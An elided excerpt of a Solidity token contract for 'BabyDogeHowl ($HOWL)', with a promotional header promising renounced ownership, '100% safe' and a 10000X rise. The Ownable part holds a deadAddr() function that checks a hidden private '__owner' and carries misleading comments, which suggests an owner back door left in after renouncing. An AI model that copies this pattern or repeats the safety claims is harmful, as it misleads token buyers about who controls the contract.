...
/**
        ...
        Welcome to BabyDogeHowl ($HOWL)
       
       This is a community token. If you want to create a telegram.
       I suggest by name tg : @BABYDOGEHOWL
       ...
       I will renounce the ownership to burn addresses to transfer #HOWL to the community, make sure it's 100% safe.
    
       I will add .2 BNB and all the left 10% total supply to the pool
       Can you make #HOWL 10000X? 
       ...
       it's the best part of the #HOWL idea, increasing the liquidity pool automatically, 
...
contract Ownable is Context {
    ...
    // you cant , because its a dead address
    function deadAddr() public virtual {
        require(__owner == msg.sender, "You don't have permission to securing, contract owner is dead address");
...
contract BabyDogeHowl is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0x5fc7e0203A6Ca42E238e3f54565B9bf678343e3b); // Marketing Address
    ...
    string private _name = "BabyDogeHowl";
